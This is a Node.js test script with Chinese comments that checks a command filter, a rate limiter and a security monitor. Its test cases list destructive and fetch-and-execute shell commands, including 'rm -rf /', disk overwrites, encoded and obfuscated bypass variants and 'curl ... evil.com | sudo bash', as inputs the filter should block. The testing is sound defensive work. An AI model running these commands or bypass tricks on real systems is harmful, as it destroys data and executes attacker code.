#!/usr/bin/env node

/**
 * 安全系统测试脚本
 * 测试各种安全功能和绕过尝试
 */

const CommandFilter = require('./lib/command-filter');
const SecurityMonitor = require('./lib/security-monitor');

console.log('🔒 开始安全系统测试...\n');

// 创建测试实例
const commandFilter = new CommandFilter();
const securityMonitor = new SecurityMonitor();

// 测试用例
const testCases = [
  // 基础危险命令
  { command: 'rm -rf /', expected: true, description: '基础删除命令' },
  { command: 'shutdown -h now', expected: true, description: '系统关机命令' },
  { command: 'dd if=/dev/zero of=/dev/sda', expected: true, description: '磁盘破坏命令' },

  // 编码绕过尝试
  { command: 'echo cm0gLXJmIC8K | base64 -d | sh', expected: true, description: 'Base64编码绕过' },
  { command: 'printf "\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f" | sh', expected: true, description: '十六进制编码绕过' },

  // 命令序列攻击
  { command: 'ls; rm -rf /', expected: true, description: '命令序列攻击' },
  { command: 'echo test && shutdown', expected: true, description: '条件执行攻击' },
  { command: 'wget http://evil.com/script.sh | sh', expected: true, description: '下载执行攻击' },

  // 混淆技巧
  { command: 'r""m -rf /', expected: true, description: '引号混淆' },
  { command: '/bin/rm -rf /', expected: true, description: '绝对路径绕过' },
  { command: '$(which rm) -rf /', expected: true, description: '命令替换绕过' },

  // 高级攻击
  { command: 'echo "rm -rf /" > /tmp/evil.sh; chmod +x /tmp/evil.sh', expected: true, description: '脚本创建攻击' },
  { command: 'curl -s http://evil.com | sudo bash', expected: true, description: '远程脚本执行' },

  // 安全命令（应该通过）
  { command: 'ls -la', expected: false, description: '安全的列表命令' },
  { command: 'cat /etc/hostname', expected: false, description: '安全的查看命令' },
  { command: 'ps aux', expected: false, description: '安全的进程查看' },
  { command: 'echo "Hello World"', expected: false, description: '安全的输出命令' },
];

// 执行测试
let passed = 0;
let failed = 0;

console.log('📋 执行命令过滤测试:\n');

testCases.forEach((testCase, index) => {
  // 为每个测试使用不同的用户ID，避免速率限制影响
  const testUserId = `test-user-${index}`;
  const result = commandFilter.isDangerous(testCase.command, testUserId);
  const success = result.isDangerous === testCase.expected;

  if (success) {
    passed++;
    console.log(`✅ 测试 ${index + 1}: ${testCase.description}`);
    console.log(`   命令: ${testCase.command}`);
    if (result.isDangerous) {
      console.log(`   结果: 已拦截 (${result.severity}) - ${result.reason}`);
    } else {
      console.log(`   结果: 已通过`);
    }
  } else {
    failed++;
    console.log(`❌ 测试 ${index + 1}: ${testCase.description}`);
    console.log(`   命令: ${testCase.command}`);
    console.log(`   期望: ${testCase.expected ? '拦截' : '通过'}`);
    console.log(`   实际: ${result.isDangerous ? '拦截' : '通过'}`);
    if (result.isDangerous) {
      console.log(`   原因: ${result.reason}`);
    }
  }
  console.log('');
});

// 测试速率限制
console.log('⏱️ 测试速率限制功能:\n');

const testUserId = 'rate-limit-test-user';

// 模拟快速命令执行
console.log('模拟快速命令执行...');
for (let i = 0; i < 5; i++) {
  const result = commandFilter.isDangerous('ls', testUserId);
  console.log(`命令 ${i + 1}: ${result.isDangerous ? '被拦截' : '通过'}`);
}

// 模拟危险命令尝试
console.log('\n模拟危险命令尝试...');
for (let i = 0; i < 4; i++) {
  const result = commandFilter.isDangerous('rm -rf /', testUserId);
  console.log(`危险命令 ${i + 1}: ${result.isDangerous ? '被拦截' : '通过'} - ${result.reason}`);
}

// 检查用户状态
const userStatus = commandFilter.getUserRateLimitStatus(testUserId);
console.log('\n用户状态:');
console.log(`- 是否被封禁: ${userStatus.blocked}`);
console.log(`- 命令计数: ${userStatus.commandCount}`);
console.log(`- 危险尝试: ${userStatus.dangerousAttempts}`);

// 测试安全监控
console.log('\n🔍 测试安全监控功能:\n');

// 模拟安全事件
securityMonitor.logSecurityEvent({
  type: 'command-violation',
  ownerId: 'test-user-1',
  ownerName: 'TestUser1',
  command: 'rm -rf /',
  reason: '尝试删除根目录',
  severity: 'critical'
});

securityMonitor.logSecurityEvent({
  type: 'command-violation',
  ownerId: 'test-user-2',
  ownerName: 'TestUser2',
  command: 'shutdown',
  reason: '尝试关闭系统',
  severity: 'high'
});

// 获取统计信息
const stats = securityMonitor.getSecurityStats();
console.log('安全统计:');
console.log(`- 总事件数: ${stats.totalEvents}`);
console.log(`- 最近事件: ${stats.recentEvents}`);
console.log(`- 今日事件: ${stats.dailyEvents}`);
console.log(`- 被封禁用户: ${stats.blockedUsers}`);
console.log(`- 高风险用户: ${stats.highRiskUsers}`);

// 测试威胁评分
const threatScore1 = securityMonitor.getUserThreatScore('test-user-1');
const threatScore2 = securityMonitor.getUserThreatScore('test-user-2');

console.log('\n威胁评分:');
console.log(`TestUser1: 分数=${threatScore1.score}, 风险=${threatScore1.riskLevel}, 违规=${threatScore1.violations}`);
console.log(`TestUser2: 分数=${threatScore2.score}, 风险=${threatScore2.riskLevel}, 违规=${threatScore2.violations}`);

// 测试结果总结
console.log('\n📊 测试结果总结:');
console.log(`✅ 通过: ${passed}/${testCases.length}`);
console.log(`❌ 失败: ${failed}/${testCases.length}`);
console.log(`📈 成功率: ${((passed / testCases.length) * 100).toFixed(1)}%`);

if (failed === 0) {
  console.log('\n🎉 所有测试通过！安全系统工作正常。');
} else {
  console.log('\n⚠️ 部分测试失败，请检查安全配置。');
}

// 性能测试
console.log('\n⚡ 性能测试:');
const startTime = Date.now();
const iterations = 1000;

for (let i = 0; i < iterations; i++) {
  commandFilter.isDangerous('ls -la', 'perf-test-user');
}

const endTime = Date.now();
const avgTime = (endTime - startTime) / iterations;

console.log(`执行 ${iterations} 次命令检查:`);
console.log(`总时间: ${endTime - startTime}ms`);
console.log(`平均时间: ${avgTime.toFixed(2)}ms/次`);
console.log(`处理速度: ${(1000 / avgTime).toFixed(0)} 次/秒`);

console.log('\n🔒 安全系统测试完成！');
